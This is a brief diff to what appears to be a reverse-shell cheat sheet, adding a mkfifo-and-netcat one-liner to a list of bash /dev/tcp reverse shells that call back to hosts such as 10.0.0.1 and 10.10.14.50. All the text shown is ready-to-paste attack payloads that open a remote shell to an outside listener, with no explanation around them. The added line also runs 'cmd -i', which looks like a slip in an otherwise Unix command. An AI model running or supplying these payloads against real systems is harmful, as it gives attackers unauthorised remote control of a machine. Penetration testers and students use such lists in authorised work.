@@ -13,6 +13,8 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 
 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc 10.10.14.50 443 >/tmp/f
+
 /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
 ```
 
